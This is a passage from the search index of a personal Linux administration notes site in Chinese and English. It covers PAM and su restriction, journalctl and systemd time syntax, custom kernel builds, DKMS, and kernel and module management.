this is a protected package; it should not be removed\n(Reading database ... 286736 files and directories currently installed.)\nRemoving libc6:i386 (2.35-0ubuntu3.9) ...\nPurging configuration files for libc6:i386 (2.35-0ubuntu3.9) ...\ndpkg: warning: overriding problem because --force enabled:\ndpkg: warning: this is a protected package; it should not be removed\nRemoving libcrypt1:i386 (1:4.4.27-1) ...\nRemoving libgcc-s1:i386 (12.3.0-1ubuntu1~22.04) ...\nRemoving gcc-12-base:i386 (12.3.0-1ubuntu1~22.04) ...\ndpkg: libc6-i386: dependency problems, but removing anyway as you requested:\n libclang-common-6.0-dev depends on libc6-i386 (&gt;= 2.17).\n libclang-common-12-dev depends on libc6-i386 (&gt;= 2.34).\n libclang-common-10-dev depends on libc6-i386 (&gt;= 2.17).\n lib32stdc++6 depends on libc6-i386 (&gt;= 2.34).\n lib32gcc-s1 depends on libc6-i386 (&gt;= 2.35).\n\nRemoving libc6-i386 (2.35-0ubuntu3.9) ...\nPurging configuration files for libc6-i386 (2.35-0ubuntu3.9) ...\nProcessing triggers for libc-bin (2.35-0ubuntu3.9) ..\n</code></pre></p> <pre><code>\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7528\u6237\u7ba1\u7406","title":"\u7528\u6237\u7ba1\u7406","text":"<p>A multiuser system must provide basic support for user security in three areas: identification, authentication, and authorization. The identification portion of security answers the question of who users are. The authentication piece asks users to prove that they are who they say they are. Finally, authorization is used to define and limit what users are allowed to do.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#identification","title":"identification","text":"<p>The Linux kernel supports the traditional concept of a Unix user.</p> <ul> <li>User: A user is an entity that can run processes and own files.<ul> <li>kernel only know user id, don't know username</li> </ul> </li> <li>Groups are sets of users. The primary purpose of groups is to allow a user to share file access to other members of a group.</li> </ul> <ul> <li>adduser\uff1a\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237<ul> <li>useradd \u4e3a\u66f4\u5e95\u5c42\u7684\u547d\u4ee4</li> </ul> </li> <li>usermod -aG sudo user\uff1a\u5c06\u7528\u6237\u6dfb\u52a0\u5230 sudo \u7ec4</li> <li>gpasswd -d user group: \u5c06\u7528\u6237\u4ece\u7ec4\u4e2d\u5220\u9664</li> </ul> <p>sticky </p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#authentication","title":"authentication","text":"<p>When it comes to user identification, the Linux kernel knows only the numeric user IDs for process and file ownership. The kernel knows authorization rules for how to run setuid executables and how user IDs may run the setuid() family of system calls to change from one user to another. However, the kernel doesn\u2019t know anything about authentication: usernames, passwords, and so on. Practically everything related to authentication happens in user space.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#pam","title":"PAM","text":"<p>To accommodate flexibility in user authentication, in 1995 Sun Microsystems proposed a new standard called Pluggable Authentication Modules (PAM), a system of shared libraries for authentication (Open Software Foundation RFC 86.0, October 1995).</p> <p>You\u2019ll normally find PAM\u2019s application configuration files in the <code>/etc/pam.d</code> directory</p> <pre><code>#/etc/pam.d/chsh\n\nauth requisite pam_shells.so\n</code></pre> <ul> <li>function type: The function that a user application asks PAM to perform<ul> <li>auth: Authenticate a user (see if the user is who they say they are).)</li> <li>account</li> <li>session</li> <li>password: Change a user\u2019s password or other credentials.</li> </ul> </li> <li>control arguement: \u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e2a\u6d41\u7a0b\u56fe<ul> <li>sufficient: \u6210\u529f\u8fd4\u56de\u771f\uff0c\u5426\u5219\u7ee7\u7eed\u5224\u65ad</li> <li>requisite: \u6210\u529f\u7ee7\u7eed\u5224\u65ad\u3001\u5426\u5219\u8fd4\u56de\u5047</li> <li>required: \u6210\u529f\u5219\u7ee7\u7eed\u5224\u65ad\u3001\u5426\u5219\u8fd4\u56de\u5047\u5e76\u8fdb\u884c\u4e00\u6b21\u989d\u5916\u64cd\u4f5c</li> </ul> </li> <li>module<ul> <li>pam_shell.so: checks to see if the user\u2019s shell is listed in /etc/shells</li> <li>pam_unix.so: asks the user for their password and checks it</li> </ul> </li> </ul> <p>\u901a\u8fc7 man pam_ \u67e5\u770b\u5404\u79cd\u6a21\u5757\u4f5c\u7528\u3002</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7981\u6b62\u666e\u901a\u7528\u6237\u6267\u884c-su","title":"\u7981\u6b62\u666e\u901a\u7528\u6237\u6267\u884c su","text":"<p>\u4e3a\u4e86\u65b9\u4fbf IPMI \u767b\u9646\uff0croot \u7528\u6237\u6ca1\u6709\u5bc6\u7801\u3002\u56e0\u4e3a\u7981\u7528\u4e86\u5bc6\u7801\u767b\u5f55\uff0c\u56e0\u6b64\u4e0d\u7528\u62c5\u5fc3\u5b89\u5168\u3002 \u4f46\u662f\u4e3a\u4e86\u666e\u901a\u7528\u6237\u901a\u8fc7 su \u5207\u6362\u5230 root \u7528\u6237\uff0c\u9700\u8981\u989d\u5916\u8bbe\u7f6e PAM\u3002</p> <p>\u542f\u7528 pam_wheel.so \u5373\u53ef\uff0c\u68c0\u67e5\u7528\u6237\u662f\u5426\u662f root group\uff0c\u4e0d\u662f\u5219\u6388\u6743\u5931\u8d25\u3002 <pre><code>auth       sufficient pam_rootok.so\nauth       required   pam_wheel.so\n</code></pre></p> <p>pam_wheel</p> <ul> <li>\u4f5c\u7528\uff1aOnly permit root access to members of group wheel</li> <li>\u53c2\u6570\uff1a<code>pam_wheel.so [debug] [deny] [group=name] [root_only] [trust]</code><ul> <li>group \u53c2\u6570\uff1aInstead of checking the wheel or GID 0 groups, use the name group to perform the authentication.</li> </ul> </li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#authorization--file-permission","title":"authorization / File permission","text":"<p>linux \u548c windows \u6743\u9650\u6a21\u578b</p> <p>Lacking execute permission on a directory can limit the other permissions in interesting ways. For example, how can you add a new file to a directory (by leveraging the write permission) if you can't access the directory's metadata to store the information for a new, additional file? You cannot. It is for this reason that directory-type files generally offer execute permission to one or more of the user owner, group owner, or others.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u65e5\u5fd7journalctl","title":"\u65e5\u5fd7/journalctl","text":"<p>How To Use Journalctl to View and Manipulate Systemd Logs | DigitalOcean</p> <pre><code>journalctl --list-boots\njournalctl -b # \u81ea\u4e0a\u6b21reboot\u5f00\u59cblog\njournalctl -b -1 # \u4e0a\u4e00\u6b21reboot\n\njournalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\"  # YYYY-MM-DD HH:MM:SS\njournalctl --since yesterday\njournalctl -S yesterday\n\njournalctl -k # \u5185\u6838\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#sytemdtime7","title":"sytemd.time(7)","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#time-span","title":"time span","text":"<p>Time spans refer to time durations</p> <pre><code>\u2022   usec, us, \u00b5s\n\u2022   msec, ms\n\u2022   seconds, second, sec, s\n\u2022   minutes, minute, min, m\n\u2022   hours, hour, hr, h\n\u2022   days, day, d\n\u2022   weeks, week, w\n\u2022   months, month, M (defined as 30.44 days)\n\u2022   years, year, y (defined as 365.25 days)\n</code></pre> <p>example</p> <pre><code>2 h\n2hours\n48hr\n1y 12month\n55s500ms\n300ms20s 5day\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#timestamp","title":"timestamp","text":"<p>Timestamps refer to specific, unique points in time</p> <p>\u4e00\u822c\u663e\u793a\u683c\u5f0f\uff1a<code>Fri 2012-11-23 23:02:15 CET</code></p> <p>\u5305\u542b\u6beb\u79d2\u683c\u5f0f\uff08sub-second remainder is expected separated by a full stop from the seconds component.\uff09</p> <p><code>2014-03-25 03:59:56.654563</code></p> <p>\u7279\u6b8a\u5173\u952e\u5b57\uff1a\"now\", \"today\", \"yesterday\", and \"tomorrow\"</p> <p>\u76f8\u5bf9\u65f6\u95f4\uff0c<code>-</code> \u8868\u793a\u5f53\u524d\u65f6\u95f4\u51cf\u53bb timespan\uff0c<code>+</code> \u5219\u662f\u52a0\u4e0a\u3002\u4e5f\u53ef\u4ee5\u5728\u7ed3\u5c3e\u4f7f\u7528 <code>ago</code> \u548c <code>left</code>\uff08\u6ce8\u610f\u9700\u8981\u4e00\u4e2a\u7a7a\u683c\uff09</p> <p><code>+3h30min \u2192 Fri 2012-11-23 21:45:22</code></p> <p><code>@</code> \u8868\u793a\u76f8\u5bf9\u4e8e UNIX epoch</p> <p>Finally, a timespan prefixed with \"@\" is evaluated relative to the UNIX time epoch 1st Jan, 1970, 00:00.</p> <p><code>@1395716396 \u2192 Tue 2014-03-25 03:59:56</code></p> <pre><code>             Fri 2012-11-23 11:12:13 \u2192 Fri 2012-11-23 11:12:13\n                 2012-11-23 11:12:13 \u2192 Fri 2012-11-23 11:12:13\n             2012-11-23 11:12:13 UTC \u2192 Fri 2012-11-23 19:12:13\n                          2012-11-23 \u2192 Fri 2012-11-23 00:00:00\n                            12-11-23 \u2192 Fri 2012-11-23 00:00:00\n                            11:12:13 \u2192 Fri 2012-11-23 11:12:13\n                               11:12 \u2192 Fri 2012-11-23 11:12:00\n                                 now \u2192 Fri 2012-11-23 18:15:22\n                               today \u2192 Fri 2012-11-23 00:00:00\n                           today UTC \u2192 Fri 2012-11-23 16:00:00\n                           yesterday \u2192 Fri 2012-11-22 00:00:00\n                            tomorrow \u2192 Fri 2012-11-24 00:00:00\n           tomorrow Pacific/Auckland \u2192 Thu 2012-11-23 19:00:00\n                            +3h30min \u2192 Fri 2012-11-23 21:45:22\n                                 -5s \u2192 Fri 2012-11-23 18:15:17\n                           11min ago \u2192 Fri 2012-11-23 18:04:22\n                         @1395716396 \u2192 Tue 2014-03-25 03:59:56\n</code></pre> <pre><code>\u279c  ~ systemd-analyze timestamp now\n  Original form: now\nNormalized form: Mon 2024-06-03 18:09:45 CST\n       (in UTC): Mon 2024-06-03 10:09:45 UTC\n   UNIX seconds: @1717409385.708355\n       From now: 165us ago\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#calendar-event","title":"calendar event","text":"<p>Calendar events may be used to refer to one or more points in time in a single expression. They form a superset of the absolute timestamps explained above</p> <p>\u683c\u5f0f\u548c timestamps \u7c7b\u4f3c</p> <p><code>Thu,Fri 2012-*-1,5 11:12:13</code></p> <p>\u89c4\u5219</p> <ul> <li><code>*</code> \u8868\u793a\u901a\u914d\u7b26</li> <li><code>,</code> \u9017\u53f7\u5206\u9694\u8868\u793a\u591a\u4e2a\u503c</li> <li><code>..</code> \u8868\u793a\u8fde\u7eed\u7684\u4e00\u6bb5\u503c</li> <li>\u7701\u7565 date \u8868\u793a\u4eca\u5929\uff0c\u7701\u7565 time \u8868\u793a 00:00:00</li> <li><code>start/repetition</code>\uff1a\u4ece start \u5f00\u59cb\uff0c\u589e\u52a0 repetition \u7684\u500d\u6570\u7684\u6240\u6709\u503c\u3002</li> <li>date \u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>~</code> \u8868\u793a\u5012\u6570\u7684\u7b2c\u51e0\u5929\u3002\u5982 <code>*-02~01</code> \u8868\u793a 2 \u6708\u6700\u540e\u4e00\u5929\u3002<ul> <li><code>\"Mon *-05~07/1\"</code> means \"the last Monday in May.\"\u3002~07/1 \u8868\u793a\u4ece\u6700\u540e\u4e00\u5468\u5f00\u59cb\u7684\u6bcf\u4e00\u5929\uff0cmon \u5219\u9650\u5236\u4e86\u5468\u4e00\u3002</li> </ul> </li> </ul> <p>\u4e00\u4e9b\u89c4\u5219\u7684\u7b80\u5199</p> <pre><code>               minutely \u2192 *-*-* *:*:00\n                 hourly \u2192 *-*-* *:00:00\n                  daily \u2192 *-*-* 00:00:00\n                monthly \u2192 *-*-01 00:00:00\n                 weekly \u2192 Mon *-*-* 00:00:00\n                 yearly \u2192 *-01-01 00:00:00\n              quarterly \u2192 *-01,04,07,10-01 00:00:00\n           semiannually \u2192 *-01,07-01 00:00:00\n</code></pre> <p>\u793a\u4f8b</p> <pre><code>             Sat,Thu,Mon..Wed,Sat..Sun \u2192 Mon..Thu,Sat,Sun *-*-* 00:00:00\n                 Mon,Sun 12-*-* 2,1:23 \u2192 Mon,Sun 2012-*-* 01,02:23:00\n                               Wed *-1 \u2192 Wed *-*-01 00:00:00\n                      Wed..Wed,Wed *-1 \u2192 Wed *-*-01 00:00:00\n                            Wed, 17:48 \u2192 Wed *-*-* 17:48:00\n           Wed..Sat,Tue 12-10-15 1:2:3 \u2192 Tue..Sat 2012-10-15 01:02:03\n                           *-*-7 0:0:0 \u2192 *-*-07 00:00:00\n                                 10-15 \u2192 *-10-15 00:00:00\n                   monday *-12-* 17:00 \u2192 Mon *-12-* 17:00:00\n             Mon,Fri *-*-3,1,2 *:30:45 \u2192 Mon,Fri *-*-01,02,03 *:30:45\n                  12,14,13,12:20,10,30 \u2192 *-*-* 12,13,14:10,20,30:00\n                       12..14:10,20,30 \u2192 *-*-* 12..14:10,20,30:00\n             mon,fri *-1/2-1,3 *:30:45 \u2192 Mon,Fri *-01/2-01,03 *:30:45\n                        03-05 08:05:40 \u2192 *-03-05 08:05:40\n                              08:05:40 \u2192 *-*-* 08:05:40\n                                 05:40 \u2192 *-*-* 05:40:00\n                Sat,Sun 12-05 08:05:40 \u2192 Sat,Sun *-12-05 08:05:40\n                      Sat,Sun 08:05:40 \u2192 Sat,Sun *-*-* 08:05:40\n                      2003-03-05 05:40 \u2192 2003-03-05 05:40:00\n            05:40:23.4200004/3.1700005 \u2192 *-*-* 05:40:23.420000/3.170001\n                        2003-02..04-05 \u2192 2003-02..04-05 00:00:00\n                  2003-03-05 05:40 UTC \u2192 2003-03-05 05:40:00 UTC\n                            2003-03-05 \u2192 2003-03-05 00:00:00\n                                 03-05 \u2192 *-03-05 00:00:00\n                                hourly \u2192 *-*-* *:00:00\n                                 daily \u2192 *-*-* 00:00:00\n                             daily UTC \u2192 *-*-* 00:00:00 UTC\n                               monthly \u2192 *-*-01 00:00:00\n                                weekly \u2192 Mon *-*-* 00:00:00\n               weekly Pacific/Auckland \u2192 Mon *-*-* 00:00:00 Pacific/Auckland\n                                yearly \u2192 *-01-01 00:00:00\n                              annually \u2192 *-01-01 00:00:00\n                                 *:2/3 \u2192 *-*-* *:02/3:00\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u65e5\u5fd7\u6587\u4ef6","title":"\u65e5\u5fd7\u6587\u4ef6","text":"<ul> <li><code>/run/log/journal/MACHINE-ID/</code>\uff1a\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\uff0c\u91cd\u542f\u6d88\u5931</li> <li><code>/var/log/journal/MACHINE-ID</code>\uff1a\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d</li> </ul> <p>\u67e5\u770b\u5927\u5c0f\uff1a</p> <pre><code>journalctl --disk-usage  # \u65e5\u5fd7\u5927\u5c0f\uff0c\u5305\u542b\u5f52\u6863\u65e5\u5fd7\n</code></pre> <p></p> <p>\u6e05\u9664\uff1a</p> <ul> <li>vacuum\uff1a\u5220\u9664\u5f52\u6863\u7684\u65e5\u5fd7\uff08\u4e0d\u4f1a\u5220\u9664 active \u7684\uff09</li> <li>rotate\uff1a\u5c06 active \u5f52\u6863\u3002\u53ef\u4ee5\u5408\u5e76\u5230\u4e0a\u6761\u547d\u4ee4</li> </ul> <pre><code>journalctl --rotate\n\njournalctl --vacuum-time=1months  # \u4e00\u4e2a\u6708\u4ee5\u524d\u7684\u65e7\u65e5\u5fd7\u3002\u683c\u5f0f\uff1a1m, 2h, 2weeks, 4months\njournalctl --vacuum-size=100M     # \u53ea\u4fdd\u7559\u65b0\u7684100M\u5927\u5c0f\u7684\u65e5\u5fd7\n</code></pre> <p>\u8bbe\u7f6e\u6700\u5927\u65e5\u5fd7\u5927\u5c0f\uff1a</p> <pre><code>/etc/systemd/journald.conf\nSystemMaxUse=100M\n</code></pre> <p>SystemMaxUse=, RuntimeMaxUse=</p> <p>Enforce size limits on the journal files stored. The options prefixed with \"System\" apply to the journal files when stored on a persistent file system, more specifically /var/log/journal. The options prefixed with \"Runtime\" apply to the journal files when stored on a volatile in-memory file system, more specifically /run/log/journal.</p> <p>MaxFileSec=</p> <p>The maximum time to store entries in a single journal file before rotating to the next one.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u67e5\u770b\u91cd\u542f\u539f\u56e0","title":"\u67e5\u770b\u91cd\u542f\u539f\u56e0","text":"<p>https://unix.stackexchange.com/a/278166</p> <pre><code>last -x |tac |less  # last\u663e\u793a\u6700\u540elogged\u7528\u6237\uff0ctac\u5c06\u6587\u672c\u9006\u5e8f\n</code></pre> <ul> <li>\u6b63\u5e38\u987a\u5e8f\uff1a<ul> <li>reboot \u6ca1\u6709\u5bf9\u5e94\u7684 shutdown \u8868\u793a\u975e\u6b63\u5e38\u5173\u673a</li> </ul> </li> </ul> <pre><code>shutdown system down  ... &lt;-- first the system shuts down   \nreboot   system boot  ... &lt;-- afterwards the system boots\nrunlevel (to lvl 3)  # runlevel3\u8868\u793a\u65e0\u56fe\u5f62\u754c\u9762\uff0c\u5f00\u673a\u684c\u9762\u73af\u5883\u53ef\u80fd\u662frunlevel 5\n</code></pre> <p></p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u67e5\u770b-crontab-\u65e5\u5fd7","title":"\u67e5\u770b crontab \u65e5\u5fd7","text":"<pre><code>grep CRON /var/log/syslog\n\njou -u cron\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u66f4\u6362\u5185\u6838","title":"\u66f4\u6362\u5185\u6838","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>8.10.\u00a0Compiling a Kernel (debian-handbook.info)</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#disabling-the-debug-information","title":"disabling the debug information","text":"<pre><code>$ make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1\n[...]\n$ ls ../*.deb\n../linux-headers-5.10.46-falcot_5.10.46-1_amd64.deb\n../linux-image-5.10.46-falcot_5.10.46-1_amd64.deb\n../linux-image-5.10.46-falcot-dbg_5.10.46-1_amd64.deb\n../linux-libc-dev_5.10.46-1_amd64.deb\n</code></pre> <p>The whole process requires around 20 GB of free space, at least 8 GB of RAM, and several hours of compilation (utilizing one core) for a standard amd64 Debian kernel. These requirements can be drastically reduced by disabling the debug information using\u00a0<code>CONFIG_DEBUG_INFO=n</code>, but this will make it impossible to trace kernel errors (\u201coops\u201d) using\u00a0<code>gdb</code>\u00a0and also stop the creation of the\u00a0linux-image-version-dbg\u00a0package.</p> <pre><code># \u83b7\u5f97\u5f53\u524d\u5b98\u65b9kernel\u7f16\u8bd1\u914d\u7f6e\uff0c\u5982/boot/config-5.19.0-35-generic\nkernel_config=$(ls /boot/config-* | grep generic | sort -Vr | head -n 1) \ncp \"${kernel_config}\" .config\n\n# \u57fa\u4e8e\u5f53\u524d.confg\uff0c\u53ea\u8be2\u95ee\u65b0\u5185\u6838\u4e2d\u65b0\u529f\u80fd\u7684\u914d\u7f6e\nmake oldconfig \n\n# \u7f16\u8bd1\nmake -j \"$(nproc)\" bindeb-pkg LOCALVERSION=\"${kernel_localversion}\" || exit\n\n# \u5b89\u88c5\nsudo dpkg -i ../linux-image-${kernel_version}${kernel_localversion}*.deb ../linux-headers-${kernel_version}${kernel_localversion}*.deb\n\n# \u66f4\u65b0grub\uff0c\u901a\u8fc7GRUB_DEFAULT\u9009\u62e9\u7f16\u8bd1\u7684\u5185\u6838\nvim /etc/default/grub\ngrub_line=\"GRUB_DEFAULT=\\\"Advanced options for Ubuntu&gt;Ubuntu, with Linux ${kernel_version}${kernel_localversion}\\\"\"\nsudo sed -i -e \"s/^#GRUB_DEFAULT=.*/\\0\\n${grub_line}/\" \"${grub_config}\"\n\nsudo update-grub\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#missing-certificate","title":"missing certificate","text":"<p>Building a custom kernel based on these settings will fail if\u00a0<code>debian/certs/debian-uefi-certs.pem</code>\u00a0does not exist. This file can either be obtained from the kernel team's Git repository and placed into the source tree, or it can be replaced by your own certificate(s), or you'll have to disable the setting via\u00a0<code>CONFIG_SYSTEM_TRUSTED_KEYS=\"\"</code>.</p> <pre><code>sed -i -e '/^CONFIG_SYSTEM_TRUSTED_KEYS=/ c\\CONFIG_SYSTEM_TRUSTED_KEYS=\\\"\\\"' .config\nsed -i -e '/^CONFIG_SYSTEM_REVOCATION_KEYS=/ c\\CONFIG_SYSTEM_REVOCATION_KEY=\\\"\\\"' .config\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dkms","title":"dkms","text":"<p>\u4f7f\u7528 patched kernel \u540e\uff0c\u6ca1\u6709\u4e86 zfs\uff0c\u65e0\u6cd5\u542f\u52a8 lxc\u3002 Ubuntu 20.04, building patched kernel results in no ZFS support - Ask Ubuntu</p> <p>https://debian-handbook.info/browse/stable/sect.kernel-compilation.html#sect.modules-build</p> <ul> <li>\u4e00\u4e9b\u6a21\u5757\u4e0d\u80fd\u6253\u5305\u5230 linux \u5185\u6838\u4e2d</li> <li>\u4f7f\u7528 dkms \u81ea\u52a8\u5316\u7f16\u8bd1\u8fd9\u4e9b\u6a21\u5757\u3002\u9700\u8981\u5b89\u88c5\u4e86\u5bf9\u5e94\u7684<code>linux-headers-*</code></li> </ul> <p>Compiling External Modules Some modules are maintained outside of the official Linux kernel. To use them, they must be compiled alongside the matching kernel. While we could manually extract the tarball and build the module, in practice we prefer to automate all this using the DKMS framework (Dynamic Kernel Module Support). Most modules offer the required DKMS integration in a package ending with a\u00a0<code>-dkms</code>\u00a0suffix. \u00a0In our case, installing\u00a0dahdi-dkms\u00a0is all that is needed to compile the kernel module for the current kernel provided that we have the\u00a0linux-headers-*\u00a0package matching the installed kernel. For instance, if you use\u00a0linux-image-amd64, you would also install\u00a0linux-headers-amd64.</p> <pre><code>sudo apt install zfs-dkms\n\ndkms status\n# zfs/2.1.5, 5.19.17, x86_64: installed\n\ndkms build\n\ndkms install\ndkms uninstall  zfs/2.1.5\n\ndkms add\ndkms remove zenpower/$(VERSION)   --all\n</code></pre> <p>\u4f8b\u5b50\uff1aTa180m/zenpower3: Migrated to Gitea (github.com)</p> <ul> <li>\u5b89\u88c5 header<ul> <li>pve \u4f7f\u7528\u81ea\u5df1\u7684\u5185\u6838\uff0c\u56e0\u6b64\u4e5f\u662f\u5b89\u88c5\u81ea\u5df1\u7684 header</li> </ul> </li> </ul> <pre><code>apt install linux-headers-$(uname -r)\n\n#pve\napt install proxmox-headers-$(uname -r)\n</code></pre> <pre><code>dkms-install:\n        dkms --version &gt;&gt; /dev/null\n        mkdir -p $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/dkms.conf $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/Makefile $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/zenpower.c $(DKMS_ROOT_PATH)\n\n        sed -e \"s/@CFLGS@/${MCFLAGS}/\" \\\n            -e \"s/@VERSION@/$(VERSION)/\" \\\n            -i $(DKMS_ROOT_PATH)/dkms.conf\n\n        dkms add zenpower/$(VERSION)\n        dkms build zenpower/$(VERSION)\n        dkms install zenpower/$(VERSION)\n\ndkms-uninstall:\n        dkms remove zenpower/$(VERSION) --all\n        rm -rf $(DKMS_ROOT_PATH)\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u5220\u9664\u5185\u6838","title":"\u5220\u9664\u5185\u6838","text":"<pre><code>dpkg --get-selections | grep 5.19.17\n\napt remove xxx\n</code></pre> <p>\u6216\u8005\u624b\u52a8\u5220\u9664</p> <pre><code>cd /boot/\nrm -rf *3.19.8*\n\nupdate-grub\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u5185\u6838\u6a21\u5757","title":"\u5185\u6838\u6a21\u5757","text":"<pre><code>find /lib/modules/$(uname -r) -type f -name '*.ko'\n\nmodprobe xxx\nmodprobe -r xxx # \u5220\u9664\n\n\nlsmod |grep xxx\nrmmod xxx\n</code></pre> <ol> <li> <p><code>depmod</code>: 